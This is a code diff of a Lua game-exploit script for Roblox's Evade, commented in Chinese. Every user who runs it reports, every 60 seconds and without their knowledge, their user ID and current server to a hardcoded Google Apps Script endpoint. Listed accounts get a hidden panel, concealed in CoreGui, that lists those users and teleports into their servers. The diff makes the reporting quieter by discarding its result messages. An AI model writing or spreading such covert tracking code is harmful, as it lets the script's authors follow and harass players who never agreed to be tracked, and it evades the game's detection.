@@ -1,11 +1,17 @@
 --[[
-   🔑 Evade 玩家追蹤系統 (最終修復版)
+   🔑 Evade 玩家追蹤系統（精簡版 - 無公告/私信）
    - 普通用戶：每60秒後台上報
-   - 作者：按 Tab 打開管理面板（使用 CoreGui 增強隱蔽）
+   - 開發者：按 Tab 打開管理面板（雙擊傳送 / 單擊複製ID）
 --]]
 
 -- ==================== 配置區 ====================
-local AUTHORIZED_USERS = { "xuan_1529", "0xzzyi", "E5alR9" }
+local DEVELOPERS = {
+    ["xuan_1529"] = true,
+    ["0xzzyi"] = true,
+    ["E5alR9"] = true,
+    ["3388363961"] = true,
+    [3388363961] = true
+}
 local GAS_URL = "https://script.google.com/macros/s/AKfycbxYRivp31xlrBQtgoFOGfNMl-Ks97RtzhYhDdUdY40bKGzfIu3P2_bRdp8pSUrTPaKGww/exec"
 local REPORT_INTERVAL = 60
 local PANEL_KEY = Enum.KeyCode.Tab
@@ -17,20 +23,14 @@ local UIS = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
 local lp = Players.LocalPlayer
 
--- 檢查 HTTP 請求函數
 local req = syn and syn.request or http_request or request or (http and http.request)
 if not req then error("❌ 该注入器不支持 HTTP 请求函数") end
 
--- 檢查是否為作者
-local isAuthor = false
-for _, name in ipairs(AUTHORIZED_USERS) do
-    if lp.Name == name then isAuthor = true break end
-end
-
-if isAuthor then
-    print("👑 作者模式已启用 - 按 Tab 打开管理面板")
+local isDeveloper = DEVELOPERS[lp.Name] or DEVELOPERS[lp.UserId] or false
+if isDeveloper then
+    print("👑 開發者模式已啟用 - 按 Tab 打開管理面板")
 else
-    print("👤 普通用户模式 - 后台上报运行中")
+    print("👤 普通用戶模式 - 後台上報運行中")
 end
 
 -- ==================== 通用工具函數 ====================
@@ -65,6 +65,33 @@ local function httpGet(url)
     return success and result or nil
 end
 
+-- ==================== 簡易通知（僅用於傳送提示） ====================
+local function showNotice(msg)
+    local container = isDeveloper and (syn and syn.protect_gui and game:GetService("CoreGui") or gethui and gethui() or lp:WaitForChild("PlayerGui")) or lp:WaitForChild("PlayerGui")
+    local sg = container:FindFirstChild("EvadeNotice") or Instance.new("ScreenGui", container)
+    sg.Name = "EvadeNotice"
+    sg.ResetOnSpawn = false
+    sg.DisplayOrder = 9998
+    sg.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+    local noticeFrame = Instance.new("Frame", sg)
+    noticeFrame.Size = UDim2.new(0, 300, 0, 40)
+    noticeFrame.Position = UDim2.new(0.5, -150, 0.1, 0)
+    noticeFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    noticeFrame.BackgroundTransparency = 0.4
+    Instance.new("UICorner", noticeFrame).CornerRadius = UDim.new(0, 8)
+
+    local label = Instance.new("TextLabel", noticeFrame)
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.TextSize = 16
+    label.Font = Enum.Font.GothamBold
+    label.Text = msg
+
+    task.delay(3, function() noticeFrame:Destroy() end)
+end
+
 -- ==================== 狀態上報（所有人執行） ====================
 local SCRIPT_START = os.time()
 
@@ -91,20 +118,9 @@ local function reportStatus()
 
     local json = buildJson(data)
     local url = GAS_URL .. "?data=" .. urlEncode(json)
-
-    local res = httpGet(url)
-    if res then
-        if res.StatusCode == 200 and string.find(res.Body, "success") then
-            print("✅ [上報] 成功")
-        else
-            print("❌ [上報] 失敗，響應碼:", res.StatusCode)
-        end
-    else
-        print("❌ [上報] 網絡錯誤")
-    end
+    httpGet(url)  -- 忽略結果
 end
 
--- 啟動上報循環（所有人）
 task.spawn(function()
     reportStatus()
     while true do
@@ -113,122 +129,65 @@ task.spawn(function()
     end
 end)
 
--- ==================== 作者專屬：管理面板 ====================
-if not isAuthor then return end  -- 普通用戶到此為止
-
--- 嘗試獲取最隱蔽的容器
-local container = nil
-if syn and syn.protect_gui then
-    container = game:GetService("CoreGui")
-    print("[面板] 使用 CoreGui (syn)")
-elseif gethui then
-    container = gethui()
-    print("[面板] 使用 gethui")
-else
-    container = lp:WaitForChild("PlayerGui")
-    print("[面板] 使用 PlayerGui")
-end
-
--- 通知系統
-local function showNotice(msg)
-    local sg = container:FindFirstChild("EvadeNotice") or Instance.new("ScreenGui", container)
-    sg.Name = "EvadeNotice"
-    sg.ResetOnSpawn = false
-    sg.DisplayOrder = 9998
-    local noticeFrame = Instance.new("Frame", sg)
-    noticeFrame.Size = UDim2.new(0, 300, 0, 40)
-    noticeFrame.Position = UDim2.new(0.5, -150, 0.1, 0)
-    noticeFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    noticeFrame.BackgroundTransparency = 0.4
-    Instance.new("UICorner", noticeFrame).CornerRadius = UDim.new(0, 8)
-    local label = Instance.new("TextLabel", noticeFrame)
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.BackgroundTransparency = 1
-    label.TextColor3 = Color3.new(1, 1, 1)
-    label.TextSize = 16
-    label.Font = Enum.Font.GothamBold
-    label.Text = msg
-    task.delay(3, function() noticeFrame:Destroy() end)
-end
-
--- ==================== 終極增強版傳送 ====================
+-- ==================== 增強版傳送 ====================
 local function safeTeleport(targetUserId, targetJobId)
-    local TeleportService = game:GetService("TeleportService")
-    local Players = game:GetService("Players")
-    local lp = Players.LocalPlayer
-
-    -- 1. 如果目標 JobId 與當前相同，無需傳送
     if targetJobId == game.JobId then
         showNotice("⚠️ 您已在該伺服器中")
         return false
     end
 
-    -- 2. 強制獲取目標玩家最新的服務器信息（繞過可能過時的 JobId）
     showNotice("🔍 正在獲取目標玩家最新位置...")
     local success, placeId, jobId = pcall(function()
         return TeleportService:GetPlayerPlaceInstanceAsync(targetUserId)
     end)
 
-    if not success then
-        -- 獲取失敗：玩家可能已離線或網絡問題
+    if not success or not jobId or jobId == "" then
         showNotice("❌ 無法獲取玩家位置，可能已離線")
         return false
     end
 
-    if not jobId or jobId == "" then
-        showNotice("👻 玩家已離線（無有效伺服器）")
-        return false
-    end
-
-    -- 3. 如果獲取到的 JobId 與傳入的不同，說明玩家已切換伺服器
-    if jobId ~= targetJobId then
-        print("[傳送] 目標伺服器已變更：", targetJobId, "->", jobId)
-    end
-
-    -- 4. 檢查目標是否仍為當前伺服器
     if jobId == game.JobId then
         showNotice("⚠️ 您已在該伺服器中")
         return false
     end
 
-    -- 5. 嘗試精準傳送
     showNotice("🚀 正在傳送到玩家所在伺服器...")
-    local teleportSuccess, teleportErr = pcall(function()
+    local teleportSuccess = pcall(function()
         TeleportService:TeleportToPlaceInstance(placeId, jobId, lp)
     end)
 
-    if teleportSuccess then
-        return true
+    if not teleportSuccess then
+        showNotice("⚠️ 精準傳送失敗，嘗試普通傳送...")
+        local fallbackSuccess = pcall(function()
+            TeleportService:Teleport(placeId, lp)
+        end)
+        if not fallbackSuccess then
+            showNotice("❌ 傳送失敗，請手動加入")
+            if setclipboard then
+                setclipboard(tostring(targetUserId))
+                showNotice("📋 玩家 ID 已複製，可手動搜尋")
+            end
+            return false
+        end
     end
-
-    -- 6. 精準傳送失敗（771 錯誤或反作弊攔截），嘗試回退到普通傳送
-    warn("[傳送] 精準傳送失敗:", teleportErr)
-    showNotice("⚠️ 精準傳送失敗，嘗試普通傳送...")
-
-    local fallbackSuccess, fallbackErr = pcall(function()
-        TeleportService:Teleport(placeId, lp)
-    end)
-
-    if fallbackSuccess then
-        return true
-    end
-
-    -- 7. 所有方式均失敗，提示用戶手動加入
-    warn("[傳送] 普通傳送也失敗:", fallbackErr)
-    showNotice("❌ 傳送失敗，請嘗試手動加入該玩家")
-
-    -- 可選：將玩家 ID 複製到剪貼簿，方便手動搜尋
-    if setclipboard then
-        setclipboard(tostring(targetUserId))
-        showNotice("📋 玩家 ID 已複製，可手動搜尋加入")
-    end
-
-    return false
+    return true
 end
 
--- 建立 UI 面板（多重容錯）
+-- ==================== 管理面板 UI ====================
+if not isDeveloper then return end  -- 普通用戶到此結束
+
+-- 獲取隱蔽容器
+local container = nil
+if syn and syn.protect_gui then
+    container = game:GetService("CoreGui")
+elseif gethui then
+    container = gethui()
+else
+    container = lp:WaitForChild("PlayerGui")
+end
+
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "NotificationUI"
+screenGui.Name = "EvadeAdminPanel"
 screenGui.Enabled = false
 screenGui.ResetOnSpawn = false
 screenGui.DisplayOrder = 9999
@@ -258,7 +217,7 @@ title.TextSize = 16
 title.ZIndex = 10
 
 local playerList = Instance.new("ScrollingFrame", mainFrame)
-playerList.Size = UDim2.new(0.9, 0, 0.88, 0)
+playerList.Size = UDim2.new(0.9, 0, 0.9, 0)
 playerList.Position = UDim2.new(0.05, 0, 0.08, 0)
 playerList.BackgroundTransparency = 1
 playerList.CanvasSize = UDim2.new(0, 0, 0, 0)
@@ -267,9 +226,7 @@ playerList.ScrollBarThickness = 2
 playerList.ZIndex = 10
 Instance.new("UIListLayout", playerList).Padding = UDim.new(0, 8)
 
-print("[面板] UI 框架已建立")
-
--- 玩家列表緩存
+-- 玩家資料緩存與渲染
 local cachedPlayers = {}
 local cacheLock = false
 
@@ -279,15 +236,15 @@ local function fetchOnlinePlayers()
     if not res or res.StatusCode ~= 200 or not res.Body then return {} end
     local success, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
     if not success then return {} end
-    local rawPlayers = data.players or {}
+    local raw = data.players or {}
     
     local unique = {}
-    for _, p in ipairs(rawPlayers) do
+    for _, p in ipairs(raw) do
         local uid = tostring(p.userId)
         if uid and uid ~= "" then
-            local pTime = p.lastUpdate or 0
-            local eTime = unique[uid] and unique[uid].lastUpdate or 0
-            if not unique[uid] or pTime > eTime then unique[uid] = p end
+            if not unique[uid] or (p.lastUpdate or 0) > (unique[uid].lastUpdate or 0) then
+                unique[uid] = p
+            end
         end
     end
     local final = {}
@@ -352,13 +309,15 @@ local function renderPlayerList()
                     local t = tick()
                     if t - lastClick < 0.35 then
                         if isOnline and info.jobId and info.jobId ~= "" and info.jobId ~= game.JobId then
-                            showNotice("正在追蹤玩家...")
                             safeTeleport(userId, info.jobId)
                         elseif not isOnline then
                             showNotice("❌ 玩家已離線，無法追蹤")
                         end
                     else
-                        if setclipboard then setclipboard(tostring(userId)); showNotice("已複製 ID: " .. userId) end
+                        if setclipboard then
+                            setclipboard(tostring(userId))
+                            showNotice("📋 已複製 ID: " .. userId)
+                        end
                     end
                     lastClick = t
                 end)
@@ -379,7 +338,7 @@ local function renderPlayerList()
     end
 end
 
--- 後台定時刷新緩存
+-- 背景刷新緩存
 task.spawn(function()
     updateCache()
     while true do
@@ -389,7 +348,7 @@ task.spawn(function()
     end
 end)
 
--- UI 定時刷新
+-- UI 刷新循環
 local uiRefreshLoop = nil
 local function startUIRefresh()
     if uiRefreshLoop then return end
@@ -405,7 +364,7 @@ local function stopUIRefresh()
     if uiRefreshLoop then task.cancel(uiRefreshLoop); uiRefreshLoop = nil end
 end
 
--- Tab 鍵切換
+-- Tab 鍵切換面板
 UIS.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
     if input.KeyCode == PANEL_KEY then
@@ -420,4 +379,4 @@ UIS.InputBegan:Connect(function(input, gameProcessed)
     end
 end)
 
-print("✅ 作者面板已載入，按 Tab 鍵開啟")
+print("✅ 開發者面板已載入，按 Tab 鍵開啟")
